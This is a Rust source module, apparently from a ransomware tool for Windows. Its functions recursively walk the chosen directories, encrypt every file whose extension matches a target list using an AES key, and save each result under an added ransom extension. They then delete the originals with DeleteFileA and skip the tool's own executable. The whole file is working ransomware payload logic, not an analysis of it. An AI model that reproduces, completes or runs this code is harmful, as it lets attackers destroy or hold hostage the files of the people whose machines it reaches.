extern crate winapi;

use crate::config::matches_any;
use crate::cypher::cypher::encrypt;
use crate::ui::tag;
use glob::Pattern;
use std::env;
use std::ffi::CString;
use std::fs;
use std::io;
use std::path::{Path, PathBuf};

use winapi::um::fileapi::DeleteFileA;

/// One encrypted file: its path, plus the `--dirs` root it came from.
#[derive(Debug, Clone)]
pub struct EncryptedFile {
    pub path: String,
    pub root: String,
}

#[derive(Debug, Default)]
pub struct FileTree {
    pub files: Vec<EncryptedFile>,
}

/// Walk each target directory recursively and encrypt every file whose
/// extension matches `valid_extensions`.
///
/// `exclude_globs` are matched (case-insensitive) against both the file name
/// and the full path; directories that match are pruned entirely.
///
/// `max_size` is a hard cap on file size (in bytes); `None` means no limit.
///
/// When `dry_run` is `true`, nothing is encrypted or deleted: the walker only
/// lists the files it *would* affect and returns them.
///
/// `verbose` prints per-file crypt/skip lines.
pub fn walk_and_encrypt_directories(
    target_dirs: &[PathBuf],
    ransom_ext: &str,
    valid_extensions: &[String],
    exclude_globs: &[Pattern],
    max_size: Option<u64>,
    aes_key: &[u8],
    dry_run: bool,
    verbose: bool,
) -> FileTree {
    let mut file_tree = Vec::new();

    for dir in target_dirs {
        if verbose {
            println!("{} walk    {}", tag("*"), dir.display());
        }
        let root_str = dir.to_string_lossy().to_string();
        let _ = traverse_and_encrypt(
            dir,
            ransom_ext,
            valid_extensions,
            exclude_globs,
            max_size,
            aes_key,
            dry_run,
            verbose,
            &root_str,
            &mut file_tree,
        );
    }

    FileTree { files: file_tree }
}

fn is_valid_extension(path: &Path, valid: &[String]) -> bool {
    let ext = match path.extension().and_then(|e| e.to_str()) {
        Some(e) => e,
        None => return false,
    };
    let dotted = format!(".{}", ext);
    valid.iter().any(|v| v.eq_ignore_ascii_case(&dotted))
}

fn should_skip_file(name: &str, full_path: &str, exclude_globs: &[Pattern]) -> bool {
    if matches_any(exclude_globs, name) {
        return true;
    }
    let normalised = full_path.replace('\\', "/");
    matches_any(exclude_globs, &normalised)
}

#[allow(clippy::too_many_arguments)]
fn traverse_and_encrypt(
    directory_path: &Path,
    ransom_ext: &str,
    valid_extensions: &[String],
    exclude_globs: &[Pattern],
    max_size: Option<u64>,
    aes_key: &[u8],
    dry_run: bool,
    verbose: bool,
    root_dir: &str,
    file_tree: &mut Vec<EncryptedFile>,
) -> io::Result<()> {
    if !directory_path.is_dir() {
        return Ok(());
    }

    for entry in fs::read_dir(directory_path)? {
        let entry = entry?;
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().to_string();

        if path.is_dir() {
            if matches_any(exclude_globs, &name) {
                if verbose {
                    println!("{} skip    dir {name}", tag("*"));
                }
                continue;
            }
            traverse_and_encrypt(
                &path,
                ransom_ext,
                valid_extensions,
                exclude_globs,
                max_size,
                aes_key,
                dry_run,
                verbose,
                root_dir,
                file_tree,
            )?;
            continue;
        }

        let full_path = path.to_string_lossy().to_string();

        if should_skip_file(&name, &full_path, exclude_globs) {
            if verbose {
                println!("{} skip    exclude {full_path}", tag("*"));
            }
            continue;
        }

        if let Ok(exe) = env::current_exe() {
            if let (Ok(a), Ok(b)) = (exe.canonicalize(), path.canonicalize()) {
                if a == b {
                    if verbose {
                        println!("{} skip    self {full_path}", tag("*"));
                    }
                    continue;
                }
            }
        }

        if let Some(limit) = max_size {
            if limit > 0 {
                if let Ok(meta) = path.metadata() {
                    let size = meta.len();
                    if size > limit {
                        if verbose {
                            println!("{} skip    size {size} {full_path}", tag("*"));
                        }
                        continue;
                    }
                }
            }
        }

        if !is_valid_extension(&path, valid_extensions) {
            continue;
        }

        let dest_str = format!("{}.{}", full_path, ransom_ext);

        if dry_run {
            println!("{} {full_path}", tag("dry-run"));
            file_tree.push(EncryptedFile {
                path: dest_str,
                root: root_dir.to_string(),
            });
            continue;
        }

        let source_c = match CString::new(full_path.as_bytes()) {
            Ok(c) => c,
            Err(_) => continue,
        };
        let dest_c = match CString::new(dest_str.as_bytes()) {
            Ok(c) => c,
            Err(_) => continue,
        };

        let ok = encrypt(source_c.clone(), dest_c, aes_key.to_vec());
        if verbose {
            println!("{} crypt   {full_path} -> {dest_str}", tag("*"));
        }
        if ok {
            file_tree.push(EncryptedFile {
                path: dest_str,
                root: root_dir.to_string(),
            });
            unsafe {
                DeleteFileA(source_c.as_ptr());
            }
        }
    }

    Ok(())
}
